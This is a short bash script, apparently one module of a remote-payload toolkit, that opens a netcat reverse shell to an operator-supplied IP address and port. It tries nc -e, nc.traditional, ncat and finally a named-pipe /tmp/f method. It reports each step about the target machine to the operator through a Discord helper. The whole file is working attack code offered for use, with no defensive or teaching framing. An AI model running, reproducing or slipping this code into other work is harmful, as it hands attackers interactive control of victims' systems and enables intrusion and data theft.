#!/bin/bash
# ============================================================
# Netcat Reverse Shell for Linux - Modular Remote Payload
# ============================================================
# Requires: $IP and $PT (port)
# Uses netcat specifically (for when bash /dev/tcp isn't available)
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$IP" || -z "$PT" ]]; then
    send_discord "❌ Netcat reverse shell failed on $SYSID - Missing IP or PORT"
    exit 1
fi

send_discord "🔌 **Netcat Reverse Shell Initiated**\nTarget: $SYSID\nConnecting to: $IP:$PT"

# Try different netcat variants
# Method 1: nc with -e flag (traditional)
if nc -h 2>&1 | grep -q '\-e'; then
    nc -e /bin/bash $IP $PT &
    exit 0
fi

# Method 2: nc.traditional
if command -v nc.traditional &>/dev/null; then
    nc.traditional -e /bin/bash $IP $PT &
    exit 0
fi

# Method 3: ncat (nmap's netcat)
if command -v ncat &>/dev/null; then
    ncat -e /bin/bash $IP $PT &
    exit 0
fi

# Method 4: Named pipe method (works with most nc versions)
if command -v nc &>/dev/null; then
    rm -f /tmp/f
    mkfifo /tmp/f
    cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PT > /tmp/f &
    exit 0
fi

send_discord "❌ Netcat not available on $SYSID"

